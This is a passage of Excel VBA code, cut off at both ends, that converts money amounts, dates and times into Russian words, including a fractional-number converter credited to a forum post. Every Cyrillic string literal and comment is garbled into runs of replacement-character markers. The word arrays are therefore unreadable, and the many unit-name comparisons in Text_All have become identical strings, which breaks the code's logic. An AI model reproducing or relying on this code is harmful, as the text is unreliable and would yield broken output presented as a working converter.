    avHundreds = Array("", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avThousands = Array("", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    If Number < 0 Then: sMinus = "|fffd||fffd||fffd||fffd||fffd| "
    If Number Like "*,*" Then sStr = Split(Number, ",")
    If Number Like "*.*" Then sStr = Split(Number, ".")
    If Not Number Like "*,*" And Not Number Like "*.*" Then sStr = Split(Number)
    If UBound(sStr) > 0 Then
        If Len(sStr(1)) > 2 Then sStr(1) = Left(sStr(1), 2)
        If Len(sStr(1)) = 1 Then sStr(1) = sStr(1) & "0"
    End If
    sNumber = Abs(sStr(0))
    If PodpisOnly = 1 Then
        If UBound(sStr) = 0 Then
            sKop = "00 " & Text_All("0", "|fffd||fffd||fffd|")
        Else
            If Len(sStr(1)) = 1 Then
                sKop = sStr(1) & " " & Text_All(sStr(1) & "0", "|fffd||fffd||fffd|")
            Else
                sKop = sStr(1) & " " & Text_All(sStr(1), "|fffd||fffd||fffd|")
            End If
        End If
        If Rub = 0 Then Propis_Summ_RUS = sKop: Exit Function
        If Kop = 0 Then sKop = ""
        sRubles = Text_All(sNumber, "|fffd||fffd||fffd|")
        Propis_Summ_RUS = sMinus & sNumber & " " & sRubles & sKop
        Exit Function
    End If
    Select Case Len(sNumber)
        Case 0
            Propis_Summ_RUS = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|!"
        Case 1
            Propis_Summ_RUS = avOne(sNumber)
        Case 2
            Propis_Summ_RUS = funcTeens(sNumber)
        Case 3
            Propis_Summ_RUS = funcHundreds(sNumber)
        Case 4
            Propis_Summ_RUS = avThousands(Left(sNumber, 1)) & Text_All(Left(sNumber, 1), "|fffd||fffd||fffd|") & funcHundreds(Right(sNumber, 3))
        Case 5
            Propis_Summ_RUS = funcTeens(Left(sNumber, 2), 1) & Text_All(Left(sNumber, 2), "|fffd||fffd||fffd|") & funcHundreds(Right(sNumber, 3))
        Case 6
            Propis_Summ_RUS = funcHundreds(Left(sNumber, 3), 1) & Text_All(Mid(sNumber, 2, 2), "|fffd||fffd||fffd|") & funcHundreds(Right(sNumber, 3))
        Case 7
            If Mid(sNumber, 2, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = avOne(Left(sNumber, 1)) & Text_All(Left(sNumber, 1), "|fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 2, 3), 1) & Text_All(Mid(sNumber, 3, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 8
            If Mid(sNumber, 3, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = funcTeens(Left(sNumber, 2)) & Text_All(Left(sNumber, 2), "|fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 3, 3), 1) & Text_All(Mid(sNumber, 4, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 9
            If Mid(sNumber, 4, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = funcHundreds(Left(sNumber, 3)) & Text_All(Mid(sNumber, 2, 2), "|fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 4, 3), 1) & Text_All(Mid(sNumber, 5, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 10
            If Mid(sNumber, 5, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            If Mid(sNumber, 2, 3) = "000" Then sMil = "" Else sMil = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = avOne(Left(sNumber, 1)) & Text_All(Left(sNumber, 1), "|fffd||fffd||fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 2, 3), 1) & Text_All(Mid(sNumber, 3, 2), sMil) & funcHundreds(Mid(sNumber, 5, 3), 1) & Text_All(Mid(sNumber, 6, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 11
            If Mid(sNumber, 6, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            If Mid(sNumber, 3, 3) = "000" Then sMil = "" Else sMil = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = funcTeens(Left(sNumber, 2)) & Text_All(Left(sNumber, 2), "|fffd||fffd||fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 3, 3), 1) & Text_All(Mid(sNumber, 4, 2), sMil) & funcHundreds(Mid(sNumber, 6, 3), 1) & Text_All(Mid(sNumber, 7, 2), sTis) & funcHundreds(Right(sNumber, 3))
        Case 12
            If Mid(sNumber, 7, 3) = "000" Then sTis = "" Else sTis = "|fffd||fffd||fffd|"
            If Mid(sNumber, 4, 3) = "000" Then sMil = "" Else sMil = "|fffd||fffd||fffd|"
            Propis_Summ_RUS = funcHundreds(Left(sNumber, 3)) & Text_All(Mid(sNumber, 2, 2), "|fffd||fffd||fffd||fffd||fffd|") & funcHundreds(Mid(sNumber, 4, 3), 1) & Text_All(Mid(sNumber, 5, 2), sMil) & funcHundreds(Mid(sNumber, 7, 3), 1) & Text_All(Mid(sNumber, 8, 2), sTis) & funcHundreds(Right(sNumber, 3))
    End Select
    If Rub = 0 Then
        sRubles = ""
    Else
        sRubles = Text_All(Right(sNumber, 2), "|fffd||fffd||fffd|")
        If Kop = 0 Then
            sKop = ""
        Else
            If UBound(sStr) = 0 Then
                sKop = "|fffd||fffd||fffd||fffd| " & Text_All("0", "|fffd||fffd||fffd|")
            Else
                If Len(sStr(1)) = 1 Then
                    sKop = funcTeens(sStr(1) & "0", 1) & Text_All(sStr(1) & "0", "|fffd||fffd||fffd|")
                Else
                    sKop = funcTeens(sStr(1), 1) & Text_All(sStr(1), "|fffd||fffd||fffd|")
                End If
            End If
        End If
    End If
    '    If FractionPart Then
    '
    '
    '    End If
    Propis_Summ_RUS = sMinus & Propis_Summ_RUS & sRubles & sKop
    Propis_Summ_RUS = Trim(UCase(Left(Propis_Summ_RUS, 1)) & Mid(Propis_Summ_RUS, 2))
End Function

Private Function funcTeens(sNumber, Optional Thous As Integer) As String
    If Left(sNumber, 1) = "1" Then
        funcTeens = avTeens(Right(sNumber, 1))
    Else
        If Thous = 1 Then
            funcTeens = avTens(Left(sNumber, 1)) & avThousands(Right(sNumber, 1))
        Else
            funcTeens = avTens(Left(sNumber, 1)) & avOne(Right(sNumber, 1))
            If Right(funcTeens, 5) = "|fffd||fffd||fffd||fffd| " Or Right(funcTeens, 5) = "null " Then funcTeens = Left(funcTeens, Len(funcTeens) - 5)
        End If
    End If
End Function
Private Function funcHundreds(sNumber, Optional Thous As Integer) As String
    If Thous = 1 Then
        funcHundreds = avHundreds(Left(sNumber, 1)) & funcTeens(Right(sNumber, 2), 1)
    Else
        funcHundreds = avHundreds(Left(sNumber, 1)) & funcTeens(Right(sNumber, 2))
    End If
End Function
Function Text_All(ByVal sNumber, sKind As String) As String
    If Left(sNumber, 1) = 1 And Len(sNumber) > 1 Then
        If sKind = "|fffd||fffd||fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
        If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
    Else
        Select Case Right(sNumber, 1)
            Case 1
                If sKind = "|fffd||fffd||fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
            Case 2, 3, 4
                If sKind = "|fffd||fffd||fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
            Case 0, 5 To 9
                If sKind = "|fffd||fffd||fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd| "
                If sKind = "|fffd||fffd||fffd|" Then Text_All = "|fffd||fffd||fffd||fffd||fffd||fffd| "
        End Select
    End If
End Function
Function Propis_Date_RUS(iDate, Optional iTime As Integer, Optional PodpisOnly As Integer) As String
    Application.Volatile True
    Dim avDays, avDayTeens, avDaysTens, avMonth, avYearOnes, avYearTeens, avYearThous, avYearTens
    Dim sDay As String, sMonth As String, sYear As String, sTh As String, sTens As String
    avTens = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avHundreds = Array("", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avThousands = Array("", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    avDays = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avDaysTens = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avDayTeens = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avYearOnes = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avYearTeens = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avYearTens = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avYearThous = Array("", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|")
    avMonth = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    If Not IsDate(iDate) Then Propis_Date_RUS = "|fffd||fffd||fffd||fffd||fffd||fffd|!": Exit Function
    sDay = Day(iDate)
    sMonth = Month(iDate)
    sYear = Year(iDate)
    Select Case Right(sDay, 2)
        Case 1 To 9
            sDay = avDays(sDay)
        Case 10 To 19
            sDay = avDayTeens(Right(sDay, 1))
        Case 20 To 31
            If Right(sDay, 1) = 0 Then
                sDay = avDaysTens(Left(sDay, 1))
            Else
                sDay = avTens(Left(sDay, 1)) & avDays(Right(sDay, 1))
            End If
    End Select
    sMonth = avMonth(Month(iDate))
    If Len(sYear) = 4 Then
        sTh = avThousands(Left(sYear, 1)) & Text_All(Left(Right(sYear, 4), 1), "|fffd||fffd||fffd|")
    End If
    If Left(Right(sYear, 2), 1) = "1" Then
        sTens = avYearTeens(Right(sYear, 1))
    Else
        If Right(sYear, 1) <> "0" Then
            sTens = avTens(Left(Right(sYear, 2), 1)) & avYearOnes(Right(sYear, 1))
        Else
            sTens = avYearTens(Left(Right(sYear, 2), 1) - 1)
        End If
    End If
    If Mid(sYear, 2, 3) = "000" Then sTens = avYearThous(Left(sYear, 1)) & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ": sTh = ""
    sYear = sTh & avHundreds(Left(Right(sYear, 3), 1)) & sTens & "|fffd||fffd||fffd||fffd| "
    Propis_Date_RUS = sDay & sMonth & sYear
    If iTime <> 0 Then
        Propis_Date_RUS = Trim(Propis_Date_RUS) & ", " & Propis_Time_RUS(iDate)
    End If
    If PodpisOnly <> 0 Then
        If iTime <> 0 Then
            Propis_Date_RUS = Day(iDate) & " " & sMonth & " " & Year(iDate) & " |fffd||fffd||fffd||fffd|, " & Propis_Time_RUS(iDate, 1)
        Else
            Propis_Date_RUS = Day(iDate) & " " & sMonth & " " & Year(iDate) & " |fffd||fffd||fffd||fffd| "
        End If
    End If
    Propis_Date_RUS = Trim(Replace(UCase(Left(Propis_Date_RUS, 1)) & Mid(Propis_Date_RUS, 2), "  ", " "))

End Function

Function Propis_Time_RUS(iTime, Optional PodpisOnly As Integer) As String
    Application.Volatile True
    Dim sTime, sHours As String, sMinutes As String, sSeconds As String, sHour As String, sMin As String, sSec As String
    avOne = Array("|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    avTens = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avThousands = Array("|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    avTeens = Array("|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    sTime = Split(Format(iTime, "HH:MM:SS"), ":")
    sHours = sTime(0)
    sMinutes = sTime(1)
    sSeconds = sTime(2)
    If sHours > 0 Then avOne = Array("", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    If PodpisOnly = 0 Then
        sHour = funcTeens(sHours) & Text_All(sHours, "|fffd||fffd||fffd|")
        sMin = funcTeens(sMinutes, 1) & Text_All(sMinutes, "|fffd||fffd||fffd|")
        sSec = funcTeens(sSeconds, 1) & Text_All(sSeconds, "|fffd||fffd||fffd|")
    Else
        sHour = Val(sHours) & " " & Text_All(sHours, "|fffd||fffd||fffd|")
        sMin = Val(sMinutes) & " " & Text_All(sMinutes, "|fffd||fffd||fffd|")
        sSec = Val(sSeconds) & " " & Text_All(sSeconds, "|fffd||fffd||fffd|")
    End If
    Propis_Time_RUS = Trim(sHour & sMin & sSec)
End Function


' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ))
' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Function FractionalNumberToText(ByVal chislo$, Optional ByVal FractionDigits As Long = 0, _
                                Optional TextFractionPart As Boolean = True) As String
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: forum .vingrad .ru/act-ST/f-131/t-106328.html#
    On Error Resume Next
    Dim chislo2$, chislo3$, LengthChislo&, tekst$, Start&
    If FractionDigits > 3 Then FractionDigits = IIf(TextFractionPart, 3, 4)        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    chislo$ = Replace(Trim(chislo$), ".", ",")
    If InStr(1, chislo$, ",") Then
        chislo2 = Split(chislo, ",")(0)
        chislo3 = "0," & Split(chislo, ",", 2)(1)        '-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If FractionDigits Then chislo3 = Replace(Format(chislo3, "0." & String(FractionDigits, "0")), ".", ",")
        If TextFractionPart Then
            If Len(chislo3) > 5 Then chislo3 = Replace(Format(chislo3, "0.000"), ".", ",")
        Else
            If Len(chislo3) > 6 Then chislo3 = Replace(Format(chislo3, "0.0000"), ".", ",")
        End If
    Else
        chislo2 = chislo
    End If

    LengthChislo = Len(chislo2)        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Start = 0
    tekst = ""
    For x = LengthChislo To 1 Step -1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        Start = Start + 1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
        Select Case x
            Case 12        ' - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 100
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                scl2 = ""
            Case 11        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 2) * 1
                If num >= 1 And num <= 20 Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = Mid(chislo2, Start, 2) * 1
                    If Right(sclonMlrd, 1) * 1 = 0 Then sclonMlrd = 0        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd| 10
                    Start = Start + 1
                    x = x - 1
